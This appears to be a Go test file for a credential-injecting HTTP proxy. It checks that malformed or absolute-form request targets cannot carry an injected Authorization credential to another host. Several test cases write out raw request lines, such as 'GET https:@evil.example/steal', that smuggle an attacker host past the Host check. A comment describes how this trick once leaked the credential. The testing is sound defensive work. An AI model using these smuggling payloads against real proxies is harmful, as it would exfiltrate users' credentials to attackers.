package injector

import (
	"bufio"
	"context"
	"crypto/tls"
	"io"
	"net/http"
	"testing"
	"time"

	"github.com/kodustech/kodus-ai/apps/runtime-cell/internal/policy"
)

// rawRequest sends one hand-written HTTP/1.1 request head from the VM,
// through the proxy, over TLS with SNI = sni: a client library never writes
// these request targets.
func rawRequest(t *testing.T, vm *http.Client, sni, head string) (int, string) {
	t.Helper()
	tr := vm.Transport.(*http.Transport)
	conn, err := tr.DialContext(context.Background(), "tcp4", "vm")
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	tc := tls.Client(conn, &tls.Config{ServerName: sni, RootCAs: tr.TLSClientConfig.RootCAs, MinVersion: tls.VersionTLS12})
	if err := tc.Handshake(); err != nil {
		t.Fatal(err)
	}
	if _, err := io.WriteString(tc, head+"Connection: close\r\n\r\n"); err != nil {
		t.Fatal(err)
	}
	resp, err := http.ReadResponse(bufio.NewReader(tc), nil)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

func (r *rig) upstreamSawNothing(t *testing.T) {
	t.Helper()
	select {
	case h := <-r.seen:
		t.Errorf("the upstream saw a request (Authorization %q)", h.Get("Authorization"))
	default:
	}
}

func refusedTarget(t *testing.T, code int, what string) {
	t.Helper()
	if code != http.StatusBadRequest && code != http.StatusMisdirectedRequest {
		t.Errorf("%s: status %d, want 400 or 421", what, code)
	}
}

// Finding 1 of the 2026-11-14 review: "GET https:@evil.example/steal" parses
// as an opaque URL with no host, so the Host header passed the check and the
// rebuilt URL "https://<host>@evil.example/steal" sent the credential with
// Host: evil.example. No request target but origin-form, or absolute-form to
// the TLS name itself, leaves the cell.
func TestRequestTargetOtherThanTheTLSNameNeverLeavesWithTheCredential(t *testing.T) {
	r := newRig(t)
	for _, head := range []string{
		"GET https:@evil.example/steal HTTP/1.1\r\nHost: " + host + "\r\n",
		"GET https:evil.example/steal HTTP/1.1\r\nHost: " + host + "\r\n",
		"GET https://u@" + host + "/x HTTP/1.1\r\nHost: " + host + "\r\n",
		"GET https://evil.example/x HTTP/1.1\r\nHost: " + host + "\r\n",
		"GET https://" + host + ":8443/x HTTP/1.1\r\nHost: " + host + "\r\n",
		"GET http://" + host + "/x HTTP/1.1\r\nHost: " + host + "\r\n",
		"GET * HTTP/1.1\r\nHost: " + host + "\r\n",
	} {
		code, _ := rawRequest(t, r.vm, host, head)
		refusedTarget(t, code, head)
		r.upstreamSawNothing(t)
	}
}

// Absolute-form to the TLS name itself (RFC 9112 §3.2.2: a server accepts
// it) goes out like origin-form: same host, same credential.
func TestAbsoluteFormToTheTLSNameGoesOut(t *testing.T) {
	r := newRig(t)
	for _, target := range []string{"https://" + host + "/echo", "https://REGISTRY.private:443/echo"} {
		code, body := rawRequest(t, r.vm, host, "GET "+target+" HTTP/1.1\r\nHost: "+host+"\r\n")
		if code != http.StatusOK {
			t.Fatalf("%s: status %d %q", target, code, body)
		}
		if got := (<-r.seen).Get("Authorization"); got != secret {
			t.Fatalf("%s: upstream saw %q", target, got)
		}
	}
}

// The same opaque target on an inspected host with no credential: the path
// it hid ("/-/...", the npm account routes) got past ExceptPaths, and the
// request went to evil.example.
func TestOpaqueTargetOnAnInspectedHostIsRefused(t *testing.T) {
	r := newRig(t)
	pol, _ := r.inj.Policies.ForClaim("claim-1")
	pol.Inspected = []policy.InspectRule{{Host: inspectedHost, Paths: []string{"/"}, ExceptPaths: []string{"/-/"}}}
	pol.InspectSources, pol.IssuedAt = []string{"127.0.0.1"}, time.Now()
	if err := r.inj.Policies.Put(pol); err != nil {
		t.Fatal(err)
	}
	code, _ := rawRequest(t, r.vm, inspectedHost, "GET https:@evil.example/-/whoami HTTP/1.1\r\nHost: "+inspectedHost+"\r\n")
	if code != http.StatusBadRequest && code != http.StatusMisdirectedRequest && code != http.StatusForbidden {
		t.Fatalf("status %d", code)
	}
	r.upstreamSawNothing(t)
}

// The same opaque target on a placeholder-secret host: the swapped value
// never goes out.
func TestOpaqueTargetOnAPlaceholderSecretHostIsRefused(t *testing.T) {
	r := newSecretRig(t, fullStore())
	for _, head := range []string{
		"GET https:@evil.example/steal HTTP/1.1\r\nHost: " + npmHost + "\r\nAuthorization: Bearer " + r.npm.Placeholder + "\r\n",
		"GET https://u@" + npmHost + "/x HTTP/1.1\r\nHost: " + npmHost + "\r\nAuthorization: Bearer " + r.npm.Placeholder + "\r\n",
	} {
		code, _ := rawRequest(t, r.vm, npmHost, head)
		refusedTarget(t, code, head)
		r.upstreamSawNothing(t)
	}
}
